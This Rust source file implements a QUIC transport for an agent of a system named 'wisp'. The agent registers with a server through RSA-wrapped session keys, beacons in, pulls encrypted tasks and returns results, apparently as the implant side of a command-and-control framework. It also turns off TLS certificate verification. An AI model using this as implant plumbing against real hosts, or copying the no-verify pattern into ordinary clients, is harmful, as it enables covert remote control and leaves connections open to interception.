// QUIC transport — reliable UDP with TLS 1.3 (matches Go
// internal/server/quic_listener.go + quic-go). Rust `quinn` <-> Go `quic-go`
// interop verified bidirectionally (TLS1.3, ALPN "wisp", bi-stream data).
//
// Short-lived model like TCP/KCP: each register/checkin opens a fresh QUIC
// connection from a random ephemeral UDP port, exchanges one packet on a
// bi-directional stream, then closes.
//
// The agent main loop is synchronous; we run a global tokio runtime and
// block_on each I/O step, adapting quinn streams to io::Read/Write so the
// shared packet protocol works unchanged.

use crate::protocol::{
    read_packet, write_packet, Packet, TYPE_CHECKIN, TYPE_CLOSE, TYPE_REGISTER, TYPE_REGISTER_ACK,
    TYPE_REQUEST_KEY, TYPE_SERVER_KEY, TYPE_TASK,
};
use std::io::{self, Read, Write};
use std::sync::OnceLock;
use std::time::Duration;

use super::TransportError;

fn runtime() -> &'static tokio::runtime::Runtime {
    static RT: OnceLock<tokio::runtime::Runtime> = OnceLock::new();
    RT.get_or_init(|| {
        let _ = rustls::crypto::ring::default_provider().install_default();
        tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .enable_all()
            .build()
            .expect("tokio runtime")
    })
}

#[derive(Debug)]
struct NoVerify;

impl rustls::client::danger::ServerCertVerifier for NoVerify {
    fn verify_server_cert(
        &self,
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &[rustls::pki_types::CertificateDer<'_>],
        _: &rustls::pki_types::ServerName<'_>,
        _: &[u8],
        _: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self,
        _: &[u8],
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self,
        _: &[u8],
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

/// Adapt quinn streams to sync io::Read/Write by block_on each call.
struct QuicIo {
    send: quinn::SendStream,
    recv: quinn::RecvStream,
    deadline: std::time::Instant,
}

impl Read for QuicIo {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        if std::time::Instant::now() > self.deadline {
            return Err(io::Error::new(io::ErrorKind::TimedOut, "quic read timeout"));
        }
        let rt = runtime();
        match rt.block_on(self.recv.read(buf)) {
            Ok(Some(n)) => Ok(n),
            Ok(None) => Ok(0), // EOF
            Err(e) => Err(io::Error::new(io::ErrorKind::Other, format!("quic read: {e}"))),
        }
    }
}

impl Write for QuicIo {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        let rt = runtime();
        rt.block_on(self.send.write(buf))
            .map_err(|e| io::Error::new(io::ErrorKind::Other, format!("quic write: {e}")))
    }
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn endpoint() -> quinn::Endpoint {
    let mut tls = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(std::sync::Arc::new(NoVerify))
        .with_no_client_auth();
    tls.alpn_protocols = vec![b"wisp".to_vec()];
    let qc = quinn::crypto::rustls::QuicClientConfig::try_from(tls).expect("quic client config");
    let mut cc = quinn::ClientConfig::new(std::sync::Arc::new(qc));
    let mut tc = quinn::TransportConfig::default();
    tc.max_idle_timeout(Some(Duration::from_secs(60).try_into().expect("idle timeout")));
    cc.transport_config(std::sync::Arc::new(tc));

    let mut ep =
        quinn::Endpoint::client("0.0.0.0:0".parse().expect("bind")).expect("quic endpoint");
    ep.set_default_client_config(cc);
    ep
}

/// Open a fresh QUIC connection + bi stream to the server.
fn dial(host: &str, port: u16, timeout: Duration) -> Result<QuicIo, TransportError> {
    let rt = runtime();
    rt.block_on(async {
        let addr = format!("{host}:{port}")
            .parse()
            .map_err(|e| TransportError::Other(format!("addr: {e}")))?;
        let ep = endpoint();
        let connecting = ep
            .connect(addr, "wisp-server")
            .map_err(|e| TransportError::Other(format!("quic connect: {e}")))?;
        let conn = tokio::time::timeout(timeout, connecting)
            .await
            .map_err(|_| TransportError::Other("quic handshake timeout".into()))?
            .map_err(|e| TransportError::Other(format!("quic handshake: {e}")))?;
        let (send, recv) = tokio::time::timeout(timeout, conn.open_bi())
            .await
            .map_err(|_| TransportError::Other("quic open stream timeout".into()))?
            .map_err(|e| TransportError::Other(format!("open_bi: {e}")))?;
        Ok(QuicIo { send, recv, deadline: std::time::Instant::now() + timeout })
    })
}

pub struct QuicTransport {
    pub host: String,
    pub port: u16,
    pub agent_id: String,
    pub rsa_pub_pem: String,
    pub seq: u64,
    pub session_keys: Option<crate::protocol::crypto::SessionKeys>,
}

impl QuicTransport {
    pub fn new(host: &str, port: u16, agent_id: &str, rsa_pub_pem: &str) -> Self {
        QuicTransport {
            host: host.to_string(),
            port,
            agent_id: agent_id.to_string(),
            rsa_pub_pem: rsa_pub_pem.to_string(),
            seq: 0,
            session_keys: None,
        }
    }

    pub fn register(&mut self, reg_json: &[u8]) -> Result<(), TransportError> {
        if self.rsa_pub_pem.is_empty() {
            let mut key_io = dial(&self.host, self.port, Duration::from_secs(15))?;
            write_packet(&mut key_io, &Packet::new(TYPE_REQUEST_KEY, Vec::new()))?;
            key_io.flush()?;
            let key_resp = read_packet(&mut key_io)?;
            if key_resp.ptype != TYPE_SERVER_KEY || key_resp.payload.is_empty() {
                return Err(TransportError::Other("key request failed".into()));
            }
            self.rsa_pub_pem = String::from_utf8_lossy(&key_resp.payload).into_owned();
        }

        let keys = crate::protocol::crypto::SessionKeys::generate();
        let mut key_material = Vec::with_capacity(64);
        key_material.extend_from_slice(&keys.aes_key);
        key_material.extend_from_slice(&keys.hmac_key);
        let encrypted_keys =
            crate::protocol::crypto::rsa_encrypt_oaep(&self.rsa_pub_pem, &key_material)
                .map_err(TransportError::Other)?;
        let encrypted_reg = keys.encrypt(reg_json);

        let mut payload = Vec::with_capacity(4 + encrypted_keys.len() + encrypted_reg.len());
        payload.extend_from_slice(&(encrypted_keys.len() as u32).to_le_bytes());
        payload.extend_from_slice(&encrypted_keys);
        payload.extend_from_slice(&encrypted_reg);

        let mut io = dial(&self.host, self.port, Duration::from_secs(15))?;
        write_packet(&mut io, &Packet::new(TYPE_REGISTER, payload))?;
        io.flush()?;

        let ack = read_packet(&mut io)?;
        if ack.ptype != TYPE_REGISTER_ACK {
            return Err(TransportError::Other("register: unexpected ack type".into()));
        }
        keys.decrypt(&ack.payload).map_err(TransportError::Other)?;
        self.session_keys = Some(keys.clone());
        Ok(())
    }

    pub fn checkin(&mut self, results: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        self.seq += 1;
        let body = match results {
            Some(r) if !r.is_empty() => {
                let keys = self
                    .session_keys
                    .as_ref()
                    .ok_or(TransportError::Other("no session keys".into()))?;
                use crate::protocol::codec::{Codec, DefaultCodec};
                DefaultCodec::new(keys.aes_key, keys.hmac_key).encode(r)
            }
            _ => Vec::new(),
        };
        let mut payload = Vec::with_capacity(24 + body.len());
        payload.extend_from_slice(self.agent_id.as_bytes());
        payload.extend_from_slice(&self.seq.to_be_bytes());
        payload.extend_from_slice(&body);

        let mut io = dial(&self.host, self.port, Duration::from_secs(30))?;
        write_packet(&mut io, &Packet::new(TYPE_CHECKIN, payload))?;
        io.flush()?;

        let resp = read_packet(&mut io)?;
        if resp.ptype == TYPE_TASK {
            let keys = self
                .session_keys
                .as_ref()
                .ok_or(TransportError::Other("no session keys".into()))?;
            let dec = keys.decrypt(&resp.payload).map_err(TransportError::Other)?;
            Ok(dec)
        } else if resp.ptype == TYPE_CLOSE {
            Err(TransportError::Other("reauth required".into()))
        } else {
            Err(TransportError::Other("checkin: unexpected packet type".into()))
        }
    }

    pub fn reset_seq(&mut self) {
        self.seq = 0;
    }
}
